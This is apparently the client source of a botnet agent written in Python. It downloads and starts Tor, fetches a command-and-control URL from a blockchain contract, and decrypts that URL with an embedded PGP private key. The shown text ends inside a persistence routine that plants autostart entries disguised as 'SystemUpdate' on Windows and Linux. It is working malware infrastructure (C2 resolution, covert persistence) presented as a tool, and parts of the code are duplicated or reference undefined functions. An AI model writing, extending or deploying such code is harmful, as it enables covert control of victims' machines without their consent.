import argparse
import base64
import csv
import getpass
import io
import ipaddress
import json
import logging
import os
import platform
import random
import shutil
import socket
import socks
import stat
import subprocess
import sys
import tarfile
import threading
import time
import urllib.request
import zipfile
from pathlib import Path
from subprocess import PIPE, Popen
from typing import Optional

import cv2
import pgpy
import psutil
import requests
import stem
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from netaddr import IPAddress, IPNetwork
from scapy.all import ARP, Ether, ICMP, IP, TCP, sr

import blockchain_utils
from ghost_comm_lib import client as ghost_client_module
from ghost_comm_lib.client.client import Client as GhostCommClient

# ANSI Color Codes
COLOR_RESET = "\033[0m"
COLOR_RED = "\033[91m"
COLOR_PURPLE = "\033[95m"
COLOR_YELLOW = "\033[93m"
COLOR_CYAN = "\033[96m"

class ColoredFormatter(logging.Formatter):
    def format(self, record):
        log_message = super().format(record)

        # Registration logs
        if "registered bot" in log_message.lower() or "register bot" in log_message.lower():
            if record.levelname == "INFO":
                return f"{COLOR_PURPLE}{log_message}{COLOR_RESET}"
            elif record.levelname == "ERROR":
                return f"{COLOR_RED}{log_message}{COLOR_RESET}"
        # File operations (e.g., in download_file, extract_tar_gz, persistence functions)
        elif "file" in log_message.lower() or "path" in log_message.lower() or \
             "directory" in log_message.lower() or "persistence" in log_message.lower() or \
             "reg.csv" in log_message.lower() or "download" in log_message.lower() or \
             "extract" in log_message.lower() or "copy" in log_message.lower():
            return f"{COLOR_YELLOW}{log_message}{COLOR_RESET}"
        # Network operations (e.g., Tor, C2 communication, public_ip, ping, poll, send_data_through_distributed_proxy_chain)
        elif "tor" in log_message.lower() or "c2" in log_message.lower() or \
             "network" in log_message.lower() or "proxy" in log_message.lower() or \
             "ping" in log_message.lower() or "poll" in log_message.lower() or \
             "connection" in log_message.lower() or "http" in log_message.lower() or \
             "request" in log_message.lower() or "response" in log_message.lower() or \
             "url" in log_message.lower() or "ip" in log_message.lower() or \
             "ghost comm" in log_message.lower():
            return f"{COLOR_CYAN}{log_message}{COLOR_RESET}"

        return log_message

# --- Detailed Logging Configuration ---
logger = logging.getLogger('Bot')
logger.setLevel(logging.DEBUG)

# Create a console handler and set the custom formatter
ch = logging.StreamHandler()
formatter = ColoredFormatter('%(asctime)s - %(name)s - %(levelname)s - %(threadName)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
ch.setFormatter(formatter)

# Add the console handler to the logger
logger.addHandler(ch)

# Tor Expert Bundle URLs
TOR_URLS = {
    "Windows_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-windows-x86_64-14.5.6.tar.gz",
    "Windows_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-windows-i686-14.5.6.tar.gz",
    "MAC-OSx_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-macos-x86_64-14.5.6.tar.gz",
    "MAC-OSx_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-macos-i686-14.5.6.tar.gz",
    "Linux_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-linux-x86_64-14.5.6.tar.gz",
    "Linux_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-linux-i686-14.5.6.tar.gz"
}

TOR_FOLDER = "TorExpert"
TOR_EXE_NAME = "tor.exe"        # Only for Windows
TOR_BIN_NAME = "tor"            # Linux/macOS binary name
TOR_HOST = "127.0.0.1"
TOR_PORT = 9050

DEFAULT_CONTROL_URL = "C2-OFFLINE!"
_control_url_lock = threading.Lock()
_current_control_url = DEFAULT_CONTROL_URL

EMBEDDED_PGP_KEY_B64 = (
    "LS0tLS1CRUdJTiBQR1AgUFJJVkFURSBLRVkgQkxPQ0stLS0tLQoKbFFXR0JHajFKNVVCREFDM1R4"
    "L3k5WnlTb1dRVFFDZVhoUGoyUnR0K1FRQzVnNm9ybytWY0tPZmlrN01UWmVwNwpoRWxBZFZiWGY0"
    "UkRGZk9nMUFiamg3RzFsZVJkS2hGSmpMQStPYWlGS1ZzdWtFSFpocG1UTnZiU0FvYUlPWjNICkZz"
    "UG91dFdBZldXZ0dxTlhIYVhpMitvRmd3MTdYYnQ2Ny9KYUFhVUF3VHEwT1lISnI4c3p1L0xraHdZ"
    "YnJ4WVQKZWhHU1lndTU4eGw1dkJXS0ZHU2xMZFVaOWtObVZLWWhuYWpkQXVZeUNIZHJIMG00RDJV"
    "TytnblFKZS9tdzN0Vwo3NzdmSGh2dEhuV2RnUkxlMjZUTTk5RE9CaWRmQ2syN1J4T3FXZ2lwdGxR"
    "YmNyaXI3TTFaZFF4T28zRW5HaWRLCmVOcjBOOE13clRvcE1SME1KaCttU2tvRFB2TXRVVitNNGds"
    "YzBiT2VDVkNDVWhtNEZzOE1DVUF5NnlDd3FyNTIKTmoySU1ManhMYW1BWnpybzZoQk1ITk5nRlEy"
    "QkdOVXlDTE5Od3VZWDNKbkdyMkpPN2dvRUI3TG03VDZ4WEE1MAoxQ2xCOEo2RjQrY3pOYkQ2b2Vm"
    "L2h2UkVXMDVDY2w3Z0d0UWtkUmJnUmxCKzU0YmFsMFB3QVpCaTErQ0tHd3B2CjYwbGdtYWdJN3NR"
    "MWsza0FFUUVBQWY0SEF3S3BDaklyMW55MUtQOVFXSTByTUNFdEZFaExXOHgxZ1RDcjdJNFoKK29y"
    "OVNzajhXRTZqQlMreFBwcUpDSlZ4NkFoVFEvbkdNYUIyMFovZGgvdjlqbFVmdFR2YmdiMmlMS2Nn"
    "aDhjawpxUkg0NGYzRkVsYUVpSnArZCt6SzlvZ1ZWYWdWWUE0V0JVNUQ0N1dJZFNLZFNQZU8wZk81"
    "K3pONWhCdkVwZnVSCnBGcWc4blk4UGVNRHZndGsxRmtnN3FTR2drTEZpNUZmb01VNk03Q3pISzBQ"
    "dEh1OW5MNDJaVEQ4eG01a3RDU3MKaWdJQVN0TDhXTGN0ZnIrNC9FaTZIcWswOE5ZQlJ1TDJIUk43"
    "MTczYzkvYmovSFBhUjN0SkthdXdLRWhNRU1Pego1dTNFQTI0bXo3KzQ3bEdXMEc4c2VUVUFodUN6"
    "TDZDSGRGUlNaUyt1dm9nY3Zjb0R1emJYbmpqNkh1V3pzVHZiCllXZ3FvTWFYbXZOZTR2cDBqajNF"
    "SzVhNGd0NWxVL3RHSkFGNlM3S3l1WTBiekxzUG1nZENNQW9ha3V1L1ZBdHAKT1VlR1RMTm9EbGRs"
    "ZDVMUmFidGJLbkJjZTZYc3BJV2pjdytLa2V6aXBRV1NsbCtrRm5Fd1NVVDljZ3BabytTRwpaUWNk"
    "UDl1QmxxYlMzazFaSzkyQVk0eTJMMDBGM2tORWVtZkRTck9acGtNWVExaXhlNzBvZk1HTy8vbXZQ"
    "WldDCnk0UGxIOWhGOEZ4czlsa0MxYlI2V0E1Y1pVSEQ4cVQ2RExNWVZFNnJyMjMrNEJraHZaTit2"
    "QkZrdTNxQzN1ZG0KdnRSaW4zWUZYWGMxSGFtVktFRkEyZGpYeXhaay9WOE5QSVFvby9Kd3d6MWJB"
    "bDJsZnVibFFaaVhMN3lQMHE3WgpkcHlRQkpGVmN0bUJoaHlKZTNLbVd4TDY2MUxFa3RURjhxdm1u"
    "YU4zRXhrK2hNK1l3YXA1QWhUcU5GbUs4d1hLCmYzQ3B6RE1kbDdtNS9nWUJMam1ETUVyeXMrNlhB"
    "aEFRWkdjNWwwUHRrVkMyeGVsNURPTWNmMjRxMlF4YlJDb0IKVUZnQlAvNWVLS1lsVWsvdkxvYU5K"
    "RGxGcElmVDFPZlU4b29VcnlTanZIcEg4Z3A5SGRmSUlNYUw0UjVEZjRURQpjSjZNZFZ2YmRZaEph"
    "UzlGUHArVjBFL3M4QUdQeDdsNlRkaXU0T1ZOMGFiclVnemViNDl1K1krb1FIV3lDSmxVCldPakNT"
    "eEVlR1RpWmp0d25XeHQvOFRqK1hUVUxxZi81bVE2MkdOVmQ0dzVsb0Z5SncxeG5CdXFqMlpRdDZX"
    "cGgKMXc1ZTNtZVJ1WHAzU0ZEVlJ5VmFubzE3Mmtud040d2FnbkFsdjdnQmlRbTZwSzNhK1Z2NFRx"
    "NlBhUDFORlBTagpZR3JkS2RtbmNRUXpaRzhMR1dwQVpRaE5Hd3lncWlJM0Vrei9Gb1FtRjFtSWtY"
    "ckpRV3ZtQmNNVFVHT09xTFcvCjdXK3ZRVlB6UnlUemgrN0RkM2YzNktEMDBSbWVMVEVoakdJUlBl"
    "SXJFbkxUN3FRZG5uV1NGbjlzOXhvMklVUDQKYVUzeEJ6djg3WVM2a1R5OXVFL3lndmh3dlhJbTBH"
    "MmFBQ2VMZzdSS0ZORTIxUWdjanZWNVdscDluQ2pjZ2xjZgpseTlBL1FTeFlDcjIzV1BHbWpuR3Jn"
    "R1lZdmFKTFV4REx6WU1IdHlaaHZ5REFubEMzNXBvL2luT2o5SlFseXp0CjlWcCtPcm0yK3FiUjls"
    "aVdvSmZSbFo0TDIyR0Fpa1h3WGJRVVgxb3pVakJmSUR3dExTMHRMVUF0TFMwdExUNkoKQWM0RUV3"
    "RUtBRGdXSVFSL25RZmIyalF5TVl4QVVRSysyeXVpcFUvT2pRVUNhUFVubFFJYkF3VUxDUWdIQWdZ"
    "VgpDZ2tJQ3dJRUZnSURBUUllQVFJWGdBQUtDUkMrMnl1aXBVL09qUzlWREFDeFlGdTl3VzVVZUpM"
    "WERnb1hwWG9ICnRVYm1nMms0VTJZNThYQlVPbWVpVzhLVjlsWlZQeEJtRC95aXhIVWxGMlQyNjA3"
    "VzdSbm53eHNOa0VlREJsNHEKUzlodzFmT2NTT29uTDZrNEZ2R3ZoQXFuTWVkL2IwNU1JZlozeDEr"
    "Y0V0Qm1td0NCYmorTW55K1FtYngvSmRZUQplaWZma2JmNDZvWG9mV01idkpGb0FXem9Na1J6S3Nl"
    "WFZQS0lhVm9ldHg3TG1hQVFTOVJ2YW11WkloUndsZG9VClZzNXFXc0Z1YlBhZXZjR2RsQXFTeG4x"
    "ZTg5RXp0bzFtMEdXY0t5MDh6Qmpqd1BvUHRkd0wrQVNYd0VnNTJwUkIKZEsvVHliWTFyUGJpWHZS"
    "Wm1CMlNkbWhoc3oybFhBdVVGY08zNEVwSzAwVnVnanRDT2VXU01vSHdLdEo2RUZMago5U1VHVGJy"
    "R2VCUDQrUENEWXNTZDFVZ1NsRW1jUis3Tm51L2dIMUh1azNOd2E4N2YrNm9kVFEyTmlvaWRFdk43"
    "CkdDcU9XNkc5eEVLZjd4SlpocWdOMU9CdHprN29KVlFmMzVnVDVYSGFJWjQyVE5JK3B2RnVHOXh0"
    "bk5UWmdwUEgKTUNDc002bnJmK2hnQlJWaHBGZjROclJHWkNnWWRCZUpoc0JQMFcrbHV5MmRCWVlF"
    "YVBVbmxRRU1BTEJYbVpBWApTVitueUxJYWNUbmdCTkNFWlcvZTl0dlI0VGJzUTdaNWtQcWtRamFn"
    "b1gweUovMGV4Y3lYalBzYWZnb1Q4R1oxCjl3TlZlZXY2TlJUd1dxV0lObmxhMFZBRFhxVm0weWtE"
    "bmpqQUhoVDhyNldnUW9tWjZRYjBoRTV2R1FPQ3JqKzkKVzB3K1VVVmk3UzdsQk02dUNJV01oenJ0"
    "NmFRSlAzMnJZbzdNbTNoS01jajg5K3dZZHZsVWhTd2RGbTcwd2JGNgpyaFlLZEZLVUNKSDFzNk1t"
    "d2pDbzFCYnVmTTBxRE1vU0RxUUhNanFvZlFVUkxGYjBVVzRFRGRWc0N1a3ZSL1ZuCnE0cHhOblN0"
    "UlVwamdLeFpCZ0llbjdSOVdZRHR5TE1vNkNEVGYxNUpaU1phOFVvQTVYTFBWd3hlL1FNQkNLN1AK"
    "RU5XdHVyWlFzdUdia2x2TFhZQzNZRmxZSWY5YXlTdEhPN01sNUkzK0FSdldpV0ZtTjdsY3gvdG85"
    "Q2xNZ3prQwoxenFQSTVzeXFzLzhRakUrVktzenVJczh2L3RwaHhiWXd6V3NNbEZiYVo3WXo3S1dB"
    "SzVzTnNpZ1BqZHJFRWgxCkVhRExJd0dZM3BGUnEvSkZHNWpBTmtibUZteVBYVGFCUGFKa1JJaFBm"
    "YlRWRGdDWTY2R0tURVA3cVFBUkFRQUIKL2djREFuRURhN0ZQcGptOS8xSUdtTEloRk1nVHp0T3JS"
    "a3NUQzNjZmtDcFlZb1I5OG9CeVJGMlJJZWNucmQyeAo0NUpCTmlvRlgreW9rRGMrdjZoOHJ6RE4z"
    "U3lOUnFYV3pwYjFYL05kbE5FbW5majdnd3Fjb0VOdlFReGxBa3ZJCmxqTXdtSVJ0ZUpZdVgydEtv"
    "UnViaFhrU0dXOWxUZWw5Q1FBblNuMitoMVQ4Y2p0ME51bEJyWk1CR01NN3J4eSsKUmRTU3lUamhw"
    "MCtUTVkzSk5LVFVTbW52SFA5QkF6NnRYMHJ4aXdRaE9xRlN5bXNQK3pSa2xEaVBNVmRoMUNjeApN"
    "cHBaYUVxZzMrWUgrejJESVRndWdTQ251bFRMbEZTTm1LU3gwVGVqb1hGMkgyVnZ1KzNKVUdBMWFZ"
    "VkxIVWIwCmw0UmptdWVLL05nVGF6TXk1eTFOV1llWkV2Y0VzQzRXdGgwdDNibHFBNGpzaG9kVHZE"
    "M3U5R0VsTW9WZ1Bpd0cKb3NudmphM05kb1VMb00zWFEyYTd3Y3BvN0YwbkFpejVRbXhyWDUvNXp4"
    "ZXZLdFA5dGFTd0plQ3dpZ3hIb3FGagpmTXJ1RzdpQUlMVllGOGhpd3orWjZiTnVCS050NUNYZysy"
    "TkJSSGc2d2FPa0JnTFVpbS90aGdRMlhGNUM5cWdQCjEvQ3RxbzRFdHJzYTg0WGN6YW9uZ2Q2OVVS"
    "dkN4V0t3eEpFeENSUFpMdjNJRXFZNHdYQmIwNFkrVmlwRXZUY0gKZllibS9zZEFSUlBaVVBudlhn"
    "c0hYWm1iVk5BTVVNOTRxSjVxMzl0YXdGMjMwUTlkQ3ZyNkx1dGFySEZLVGF3RQpINGxCMkVRbXBB"
    "M1FHUmUzRzlXbUgwSjQ3WnMrOVVOK1NBWTVST3ZvMU80eXFsNWoyK21iR1lseEY4RmNhUzFMCnQ2"
    "QmE1VWdqazQ2YU91ZzBBZHZzRmJPT05BMzFXZWxBNUNyQVZUTnFnUzZwdXkvaHFJQkptRllQbkRM"
    "RERhQkUKSUNoMUlIMzAxSHM1bCthWUI2RDVSdzU3RWEvTlA3VDI0bGVUbnVYZEJRTzVQVXluSkhX"
    "ZUdpaVZrVjBZUE9UQwpLd3NxQ25tdHY5SSs2N0VQREp1Q3RtbWxOMDRBVGY3THdWMEZ1ckMybmFD"
    "bE93eXp4b0FuSlpMTWxubFhZeUFYCnZ3ZU5ETGE4RXRoZlNpaWdrT2ZpdDRaWGxpQ3FtK0pNZkgx"
    "RWdxZzlnTnJvVUUzT0V3elY1ZGtRVkVrdklKenMKRlE4T2M3VTNXdFo3Wkw4bm9yMTVnOGd0eXJ3"
    "eHdZMDFST1pYVnFsOC90anA3bUJCeklwUUVoZUhDK2hYMm5BTgpSR1ZLejJwWGpUTUMyU0UwUHN3"
    "L3dacE9mZkhSYWFReERNSXhZNU00bjU2Q1h1QWRNWFUvdVFaNTZnYmowNTNFCnVIQmZQZWJEWCsy"
    "V1FKNFVGR0NkMUlIRU5VL1J2ZXFrUC95N1Q1bzZzdWg2dmcvMS8xSml0UUVmWDJwbWlEUnEKcjg3"
    "OVNDV0I2a0hNNUZQaHcwaGw4YU5BYzZ0RGU0RXhqRlJsQWVGb1BVdndVdWtzZFlOa0Z6RTFwU0t1"
    "bVFlUgppOG5taHB3L0hKU2I1Q2NGeWdFMi9ranRqcjRZL244Vk5PMExkazAxZklDTncycndEZHl6"
    "eVExK3QxdFRJUDJmCmlFUCtwRWtTejBLMGNUVHBQYWxrYlNFWkdKdjg1MjQ5SHdVMC9uRTg0c0o2"
    "bmJlQ0JJUHBZZ1N2UkQwbWpGd2IKMEN3d1ozRkg5STl4aVFHMkJCZ0JDZ0FnRmlFRWY1MEgyOW8w"
    "TWpHTVFGRUN2dHNyb3FWUHpvMEZBbWoxSjVVQwpHd3dBQ2drUXZ0c3JvcVZQem8zSC9Bdi9YM3ZS"
'eUJBZkFOR0xZOFFFSkxxeC9SWHJBMVhwcGFZRDJPS216azFvCjN0WmdieEFIZFJYcEFFeGYzRU51'
'UmZkNDdPa2ZNUHVEczBCbXE0d0tEZVBGakdXT0wrN09IVUV0bUZxSEtWSzgKckNoc09IWUduVlhZ'
'UTF1b1p3eEVyVVh4NnNhaVMvVjVGYUU4cEV0cEdHNTkrL05Da1UxVm05UUZLeG9UMEhyUgp3RlFp'
'ZEVjSEcyK3pGUTJiSjBhOWZPY3VHMFdlQTFWczVHYzF2Tkdic0tnYjB5bzVIM0VNWXRKSjVQRlJQ'
'bk4zCnd6NHJobnpua0p4Rm9XaGRlbjA2WENCZURaaGJQaUtjekFDY1J6SGlGYVo3bFBZeERqMy9a'
'ZXVWZDZsQ2t0dksKR0RHaVhPMW1senc5ZEc4U1lhckVBSEY0ei9tVE1ZZS8zdzMrMHNKMFJBWU5j'
'SkphbjNRTW9yT0FNdGJUWWFLbQpwbGZFMGJMVENaS1NFaVh6TGlMMEQ1a01yckZOK3daSkg3NE9s'
'TkhObGhsUmtHU3BiM0txNjNvR2dtWjhaRHcrCmhCaWZ5NVc0OFdkUDdVZ1lXT2ZxNzlMTy9nUzdB'
'SCswVEFuUEJEQmp1Lzc2UHZqTzdZaWZwd0JqSnhOZzgzUFQKT05LcWJxZlVDQUhudTBpdUNjM1BP'
'VmRTCj1raDJXCi0tLS0tRU5EIFBHUCBQUklWQVRFIEtFWSBCTE9DSy0tLS0tCg==')



_CONTRACT_META_CACHE: Optional[dict] = None
_EMBEDDED_PGP_KEY_CACHE: Optional[pgpy.PGPKey] = None


def _candidate_contract_meta_paths() -> list[Path]:
    candidates: list[Path] = []

    env_path = os.environ.get("C2_CONTRACT_META")
    if env_path:
        candidates.append(Path(env_path).expanduser())

    module_path = Path(__file__).resolve()
    candidates.append(module_path.parent / "contract_meta.json")
    candidates.append(Path.cwd() / "contract_meta.json")

    try:
        ghost_module_path = Path(ghost_client_module.__file__).resolve()
        candidates.append(ghost_module_path.parent / "contract_meta.json")
        candidates.append(ghost_module_path.parent.parent / "contract_meta.json")
    except Exception:
        pass

    seen: set[Path] = set()
    unique: list[Path] = []
    for candidate in candidates:
        try:
            resolved = candidate.resolve()
        except Exception:
            resolved = candidate
        if resolved in seen:
            continue
        seen.add(resolved)
        unique.append(resolved)
    return unique


def _load_contract_meta() -> Optional[dict]:
    global _CONTRACT_META_CACHE
    if _CONTRACT_META_CACHE is not None:
        return _CONTRACT_META_CACHE

    for path in _candidate_contract_meta_paths():
        if not path.is_file():
            continue
        try:
            with path.open("r", encoding="utf-8") as fh:
                _CONTRACT_META_CACHE = json.load(fh)
                return _CONTRACT_META_CACHE
        except Exception as exc:
            logging.getLogger("ControlURL").warning(f"Failed to load contract metadata from {path}: {exc}")
    return None

import os
import sys
import base64
import pgpy
import logging
from typing import Optional

_EMBEDDED_PGP_KEY_CACHE: Optional[pgpy.PGPKey] = None

def _load_embedded_pgp_key() -> Optional[pgpy.PGPKey]:
    """Load embedded PGP key and cache it. Do not attempt to unlock here."""
    global _EMBEDDED_PGP_KEY_CACHE
    logger = logging.getLogger("ControlURL")
    if _EMBEDDED_PGP_KEY_CACHE is not None:
        return _EMBEDDED_PGP_KEY_CACHE

    try:
        key_bytes = base64.b64decode(EMBEDDED_PGP_KEY_B64.encode("ascii"))
        key, _ = pgpy.PGPKey.from_blob(key_bytes)
        _EMBEDDED_PGP_KEY_CACHE = key
        logger.debug(f"Loaded embedded PGP key: is_public={key.is_public}, is_protected={getattr(key, 'is_protected', False)}")
        return key
    except Exception as exc:
        logger.error(f"Failed to load embedded PGP key: {exc}")
        _EMBEDDED_PGP_KEY_CACHE = None
        return None


def _decrypt_control_url_blob(encrypted_blob: str) -> Optional[str]:
    """
    Decrypt a base64-encoded PGP message blob using the embedded private key.
    Handles passphrase-unlocking if needed. Returns plaintext control URL or None.
    """
    logger = logging.getLogger("ControlURL")
    key = _load_embedded_pgp_key()
    if not key:
        logger.warning("No embedded PGP key available.")
        return None

    # If this key is only the PUBLIC key, it cannot be used to decrypt.
    if getattr(key, "is_public", False):
        logger.warning("Embedded PGP key is a public key only — cannot decrypt payload.")
        return None

    # Decode the incoming blob (which may already be base64-encoded JSON field)
    try:
        decoded_blob = base64.b64decode(encrypted_blob)
    except Exception:
        # If it wasn't base64, try to treat it as raw PGP blob
        decoded_blob = encrypted_blob.encode("utf-8")

    try:
        message = pgpy.PGPMessage.from_blob(decoded_blob)
    except Exception as exc:
        logger.warning(f"Failed to parse PGP message from blob: {exc}")
        return None

    # If key is protected, attempt to unlock it with passphrase from env var or prompt
    try:
        if getattr(key, "is_protected", False):
            passphrase = os.environ.get("CONTROL_PGP_PASSPHRASE")
            if not passphrase:
                # If no env var, try prompting interactively if possible
                if sys.stdin and sys.stdin.isatty():
                    try:
                        import getpass
                        passphrase = getpass.getpass("Enter PGP private key passphrase (CONTROL_PGP_PASSPHRASE): ")
                    except Exception:
                        pass

            if not passphrase:
                logger.warning("PGP private key is locked and no passphrase provided in CONTROL_PGP_PASSPHRASE.")
                return None

            # Use context manager unlock to perform decryption safely
            try:
                with key.unlock(passphrase):
                    decrypted = key.decrypt(message)
            except Exception as exc:
                logger.warning(f"Failed to decrypt PGP message while unlocked: {exc}")
                return None
        else:
            # key is not protected: decrypt directly
            try:
                decrypted = key.decrypt(message)
            except Exception as exc:
                logger.warning(f"Failed to decrypt PGP message: {exc}")
                return None

        # Extract plaintext
        plaintext = decrypted.message if hasattr(decrypted, "message") else str(decrypted)
        if isinstance(plaintext, bytes):
            plaintext = plaintext.decode("utf-8", "ignore")
        return plaintext.strip()
    except Exception as exc:
        logger.warning(f"Failed to decrypt control URL payload: {exc}")
        return None

def fetch_control_url_from_blockchain(logger: Optional[logging.Logger] = None) -> str:
    meta = _load_contract_meta()
    if not meta:
        if logger:
            logger.warning("Contract metadata not available; using default control URL.")
        return DEFAULT_CONTROL_URL

    try:
        web3 = blockchain_utils.get_web3()
        contract = blockchain_utils.get_contract_instance(web3, meta["address"], meta["abi"])
        raw_value = contract.functions.getC2Url().call()
    except Exception as exc:
        if logger:
            logger.warning(f"Failed to query control URL from blockchain: {exc}")
        return DEFAULT_CONTROL_URL

    if not raw_value:
        return DEFAULT_CONTROL_URL

    if isinstance(raw_value, bytes):
        raw_value = raw_value.decode("utf-8", "ignore")

    logger.debug(f"Raw value from blockchain: {raw_value}")

    try:
        payload = json.loads(raw_value)
    except (TypeError, json.JSONDecodeError):
        sanitized = str(raw_value).strip()
        return sanitized or DEFAULT_CONTROL_URL

    encrypted_blob = payload.get("encrypted_control_url")
    if encrypted_blob:
        logger.debug(f"Encrypted blob before decryption: {encrypted_blob}")
        decrypted = _decrypt_control_url_blob(encrypted_blob)
        if decrypted:
            return decrypted

    primary = payload.get("primary_node")
    if isinstance(primary, str) and primary.strip():
        return primary.strip()

    return DEFAULT_CONTROL_URL

def get_current_control_url():
    """Return the most recent control URL the bot knows about."""
    with _control_url_lock:
        return _current_control_url

def update_control_url(new_url):
    """Update the control URL if the server provides a new one."""
    if not new_url:
        return

    sanitized = new_url.strip()
    if not sanitized:
        return

    global _current_control_url
    with _control_url_lock:
        if sanitized != _current_control_url:
            logging.getLogger('ControlURL').info(f"Control URL updated to {sanitized}")
            _current_control_url = sanitized

def build_c2_url(path_fragment):
    """Build a full C2 URL for the given path fragment."""
    base = get_current_control_url().rstrip('/')
    fragment = path_fragment.lstrip('/')
    return f"{base}/{fragment}"

# Custom debug function removed, using logging module instead.

def go_to_root():
    """Change working directory to the filesystem root (OS-agnostic)."""
    root_dir = os.path.abspath(os.sep)
    try:
        os.chdir(root_dir)
        logger.info(f"Changed working directory to root: {root_dir}")
    except Exception as e:
        logger.error(f"Could not change to root dir: {e}")
        sys.exit(1)

def download_file(url, dest):
    if os.path.exists(dest):
        logger.debug(f"{dest} already exists, skipping download.")
        return
    logger.debug(f"Downloading {url} to {dest}...")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response, open(dest, "wb") as out_file:
            out_file.write(response.read())
        debug("Download succeeded.")
    except Exception as e:
        logger.error(f"Download failed: {e}")
        sys.exit(1)

def extract_tar_gz(tar_path, extract_to):
    logger.debug(f"Extracting {tar_path} to {extract_to}...")
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(path=extract_to)
    logger.debug("Extraction complete.")

def find_tor_binary(base_folder, bin_name):
    for root, dirs, files in os.walk(base_folder):
        if bin_name in files:
            return os.path.join(root, bin_name)
    return None

def detect_platform_key():
    system = platform.system()
    arch = platform.machine().lower()  # normalize

    if system == "Windows":
        if arch in ("amd64", "x86_64"):
            return "Windows_86_64"
        elif arch in ("i386", "i686", "x86"):
            return "Windows_i686"
    elif system == "Darwin":
        if arch == "x86_64":
            return "MAC-OSx_86_64"
        elif arch in ("i386", "i686"):
            return "MAC-OSx_i686"
        elif arch == "arm64":
            logger.error("macOS ARM64 detected, no prebuilt Tor bundle in TOR_URLS")
            sys.exit(1)
    elif system == "Linux":
        if arch in ("x86_64", "amd64"):
            return "Linux_86_64"
        elif arch in ("i386", "i686", "x86"):
            return "Linux_i686"
        elif arch in ("arm64", "aarch64"):
            logger.error("Linux ARM64 detected, no prebuilt Tor bundle in TOR_URLS")
            sys.exit(1)
    logger.error(f"Unsupported system/arch: {system} ({arch})")
    sys.exit(1)

def prepare_tor():
    logger.debug("PREPARING TOR...")

    # First, check if Tor exists in the system PATH
    system = platform.system()
    tor_in_path = None
    if system == "Windows":
        tor_in_path = shutil.which("tor.exe")
    else:
        tor_in_path = shutil.which("tor")

    if tor_in_path:
        logger.debug(f"SYSTEM TOR FOUND: {tor_in_path}")
        tor_path = tor_in_path
        return tor_path  # Use system-installed Tor

    # Tor not found system-wide; proceed with local Expert Bundle setup
    os.makedirs(TOR_FOLDER, exist_ok=True)
    logger.debug(f"TOR FOLDER exists: {TOR_FOLDER}")

    platform_key = detect_platform_key()  # e.g., "Linux_86_64"
    bin_name = TOR_EXE_NAME if "Windows" in platform_key else TOR_BIN_NAME
    tar_path = os.path.join(TOR_FOLDER, "tor_expert.tar.gz")
    final_bin_folder = os.path.join(TOR_FOLDER, bin_name)
    final_bin_path = os.path.join(final_bin_folder, bin_name)

    # Debug checks
    logger.debug(f"TAR PATH: {tar_path}")
    logger.debug(f"BIN NAME: {bin_name}")
    logger.debug(f"FINAL TOR PATH: {final_bin_path}")

    # Search for existing binary inside TorExpert
    extracted_bin = find_tor_binary(TOR_FOLDER, bin_name)
    if extracted_bin:
        logger.debug(f"EXISTING BINARY FOUND: {extracted_bin}")
    else:
        logger.debug("NO EXISTING BINARY FOUND")
        download_file(TOR_URLS[platform_key], tar_path)
        extract_tar_gz(tar_path, TOR_FOLDER)
        extracted_bin = find_tor_binary(TOR_FOLDER, bin_name)

        if not extracted_bin or not os.path.isfile(extracted_bin):
            logger.error(f"Tor binary '{bin_name}' not found after extraction in {TOR_FOLDER}")
            sys.exit(1)
        else:
            logger.debug(f"EXTRACTED BINARY FOUND: {extracted_bin}")

    # Ensure binary folder exists
    os.makedirs(final_bin_folder, exist_ok=True)

    # Move binary to final path if needed
    if extracted_bin != final_bin_path:
        try:
            shutil.move(extracted_bin, final_bin_path)
            logger.debug(f"MOVED BINARY TO FINAL PATH: {final_bin_path}")
        except shutil.Error:
            logger.debug(f"Binary already exists at {final_bin_path}, using existing one")

    # Set execute permission on Unix
    if "Windows" not in platform_key:
        os.chmod(final_bin_path, 0o755)
        logger.debug(f"Set execute permissions on {final_bin_path}")

    # Final debug
    logger.debug(f"USING TOR BINARY AT: {final_bin_path}")
    return final_bin_path

tor_path = prepare_tor()
logger.info(f"Tor Path: {tor_path}")
def start_tor(tor_path):
    logger.info("Starting Tor")

    logger.info(f"USING PATH: {tor_path}")
    logger.debug("Preparing torrc...")
    torrc_path = os.path.join(TOR_FOLDER, "torrc")
    if not os.path.exists(torrc_path):
        with open(torrc_path, "w") as f:
            f.write("SocksPort 9050\nLog notice stdout\nDisableNetwork 0\nAvoidDiskWrites 1\n")

    logger.debug("Starting Tor daemon...")
    try:
        subprocess.Popen([tor_path, "-f", torrc_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        logger.debug("Waiting for Tor to listen on port 9050...")
        for i in range(120):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                if s.connect_ex((TOR_HOST, TOR_PORT)) == 0:
                    logger.debug(f"Tor is ready on port 9050 after {i+1} seconds.")
                    return
            time.sleep(1)
        logger.error("Tor did not start within 2 minutes.")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Failed to start Tor: {e}")
        sys.exit(1)

def make_persistent():
    """
    Sets up the script to auto-run on system startup.
    On Windows, adds a batch file to the Startup folder.
    On Linux/macOS, skips for safety (can be added if desired).
    """
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    if system == "Windows":
        startup_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft\Windows\Start Menu\Programs\Startup"
        )
        os.makedirs(startup_path, exist_ok=True)
        shortcut = os.path.join(startup_path, "SystemUpdate.bat")
        with open(shortcut, "w") as f:
            f.write(f'start "" python "{script_path}"\n')
        logger.debug("Persistence set up successfully on Windows.")
    elif system == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        shortcut = os.path.join(autostart_dir, "SystemUpdate.desktop")
        with open(shortcut, "w") as f:
                    f.write(f"""[Desktop Entry]
        Type=Application
        Exec=python3 {script_path}
